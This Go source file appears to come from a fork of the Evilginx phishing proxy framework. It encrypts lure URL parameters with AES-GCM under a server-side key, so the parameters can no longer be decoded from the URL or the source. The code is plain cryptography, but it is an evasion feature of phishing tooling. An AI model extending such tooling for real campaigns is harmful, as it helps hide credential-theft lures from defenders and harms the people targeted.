package core

// lurecrypto.go — AES-256-GCM encryption for custom lure URL parameters.
// Parity with Evilginx Pro feature "Custom URL Parameter Encryption":
// CE 3.3.0 used RC4 with the key embedded in the URL itself (decodable by
// anyone who reads the source). Here the key lives server-side, persisted
// in general.lure_secret, and never appears in the URL.

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	mrand "math/rand"
	"net/url"
	"strings"
)

// LureKey returns the 32-byte server-side key for lure parameter encryption.
// Generated and persisted on first use so URLs survive restarts.
func (c *Config) LureKey() []byte {
	if c.general.LureSecret == "" {
		raw := make([]byte, 32)
		if _, err := rand.Read(raw); err != nil {
			return nil
		}
		c.general.LureSecret = hex.EncodeToString(raw)
		c.cfg.Set(CFG_GENERAL, c.general)
		c.cfg.WriteConfig()
	}
	key, err := hex.DecodeString(c.general.LureSecret)
	if err != nil || len(key) != 32 {
		return nil
	}
	return key
}

// BuildLureUrl appends AES-encrypted custom params to a base lure URL.
// Shared by the terminal (lures get-url) and the REST API (lures/{id}/url).
func BuildLureUrl(c *Config, base_url string, params *url.Values) string {
	if len(*params) == 0 {
		return base_url
	}
	key_arg := strings.ToLower(GenRandomString(mrand.Intn(3) + 1))
	enc, err := EncryptLureParams(c.LureKey(), params.Encode())
	if err != nil {
		return base_url
	}
	return base_url + "?" + key_arg + "=" + enc
}

// EncryptLureParams encrypts an encoded query string into
// base64url(nonce[12] || ciphertext+tag), safe to place in a URL.
func EncryptLureParams(key []byte, params string) (string, error) {
	if len(key) != 32 {
		return "", fmt.Errorf("lure key: bad length %d", len(key))
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ct := gcm.Seal(nil, nonce, []byte(params), nil)
	return base64.RawURLEncoding.EncodeToString(append(nonce, ct...)), nil
}

// DecryptLureParams reverses EncryptLureParams. Returns ok=false on any
// mismatch — GCM is authenticated, so legacy RC4 values fail cleanly here
// and fall through to the RC4 path.
func DecryptLureParams(key []byte, blob string) (string, bool) {
	if len(key) != 32 {
		return "", false
	}
	raw, err := base64.RawURLEncoding.DecodeString(blob)
	if err != nil || len(raw) < 12+16 {
		return "", false
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", false
	}
	pt, err := gcm.Open(nil, raw[:12], raw[12:], nil)
	if err != nil {
		return "", false
	}
	return string(pt), true
}
